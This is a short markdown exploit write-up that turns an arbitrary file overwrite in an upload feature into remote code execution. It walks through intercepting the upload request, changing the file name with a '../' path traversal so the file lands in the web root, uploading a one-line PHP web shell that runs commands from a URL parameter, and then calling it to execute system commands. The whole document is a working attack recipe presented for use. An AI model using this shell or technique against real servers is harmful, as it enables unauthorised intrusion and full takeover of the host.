# Arbitrary File Overwrite to RCE via PHP File Upload

## Overview
This exploit leverages an **Arbitrary File Overwrite** vulnerability to achieve **Remote Code Execution (RCE)** by uploading a `.php` file into the web root.

## Exploit Steps

1. **File Upload Restriction Bypass**
   - The application allows image uploads in `/media` or `/files` directories.
   - However, an Arbitrary File Overwrite vulnerability exists.

2. **Intercepting and Modifying the Request**
   - Use Burp Suite or another proxy tool to intercept the file upload request.
   - Modify the `file_name` parameter to:
     ```
     file_name="../webrootExec.php"
     ```
   - This moves the file to the web root (e.g., `/var/www/html/webrootExec.php`).

3. **Uploading a Malicious PHP File**
   - Create a PHP web shell:
     ```php
     <?php system($_GET['cmd']); ?>
     ```
   - Upload it to the web root.

4. **Achieving Remote Code Execution (RCE)**
   - Access the uploaded file in a browser:
     ```
     http://target.com/webrootExec.php?cmd=whoami
     ```
   - Execute arbitrary system commands.
